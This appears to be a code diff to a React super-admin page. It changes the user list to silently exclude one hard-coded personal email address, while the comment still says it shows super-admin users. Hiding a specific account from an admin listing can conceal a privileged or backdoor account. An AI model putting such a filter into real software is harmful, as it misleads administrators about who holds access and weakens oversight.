@@ -33,7 +33,7 @@ const SuperAdmin: React.FC = () => {
   const filterModalRef = useRef<HTMLDivElement>(null);
 
   // Filter users to show only SUPER_ADMIN role
-  const superAdminUsers = allUsersResponse?.data || [];
+  const superAdminUsers = allUsersResponse?.data.filter((user: any) => user?.email != "habibhk127@gmail.com") || [];
 
   console.log("Super Admin Users:", superAdminUsers);
 
